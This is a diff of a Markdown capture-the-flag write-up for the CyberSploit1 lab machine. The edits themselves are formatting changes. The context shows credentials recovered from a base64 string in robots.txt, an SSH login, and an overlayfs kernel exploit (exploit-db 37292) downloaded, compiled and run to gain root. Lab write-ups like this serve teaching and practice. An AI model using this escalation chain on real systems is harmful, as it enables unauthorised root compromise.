@@ -133,7 +133,7 @@ Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
 └─$ curl -s http://192.168.198.92/robots.txt | base64 -d
 cybersploit{youtube.com/c/cybersploit}
 ```
-The base64-encoded looks very much like a flag, but it wasn't (any more).
+The base64-encoded looks very much like a flag, but it wasn't (any more).  
 Could it be the password for the `itsskv` user. Let's try it!
 
 ### Login as itsskv via SSH
@@ -276,7 +276,7 @@ Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37292.c
 File Type: ASCII text
 Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37293.txt
 ```
-There are two possible overlayfs-related ones for the specific kernel versions.
+There are two possible overlayfs-related ones for the specific kernel versions.  
 Let's examine them more closely.
 
 ### Examine the possible exploits
@@ -440,7 +440,8 @@ References
 
 ## EDB Note: Exploit Mirror - https://www.exploit-db.com/exploits/37292  
 ```
-The first one seems more direct. Let's transfer it and compile it.
+The first one seems more direct.  
+Let's transfer it and compile it.
 
 ### Transfer the exploit and compile it
 
@@ -467,7 +468,10 @@ Saving to: `37292.c'
 100%[================================================================================================================================================>] 4,968       --.-K/s   in 0s      
 
 2024-09-13 16:58:27 (22.6 MB/s) - `37292.c' saved [4968/4968]
+```
 
+Then we compile and run the exploit
+```
 itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o ofs
 itsskv@cybersploit-CTF:/tmp$ chmod +x ofs 
 itsskv@cybersploit-CTF:/tmp$ ./ofs 
@@ -481,6 +485,7 @@ creating shared library
 uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
 #   
 ```
+Excellent, we are root!
 
 ### Get the root flag
 
